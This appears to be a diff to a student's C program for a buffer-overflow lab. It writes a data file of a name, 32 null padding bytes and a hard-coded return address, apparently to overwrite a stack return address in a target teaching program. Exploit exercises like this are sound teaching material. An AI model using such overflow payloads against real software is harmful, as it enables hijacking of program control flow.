@@ -16,7 +16,7 @@ static const unsigned int lReturnAddress = 0x00400890;
 static const char sName[] = "Chinmay Bhandaru";
 
 int main(void) {
-
+    int i;
     FILE *psFile = fopen("dataB", "w");
     if (psFile == NULL) {
         printf("Error opening file\n");
@@ -24,6 +24,9 @@ int main(void) {
     }
 
     fprintf(psFile, sName);
+    for (i = 0; i < 32; i++) {
+        putc(0, psFile);
+    }
     fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);
 
     fclose(psFile);
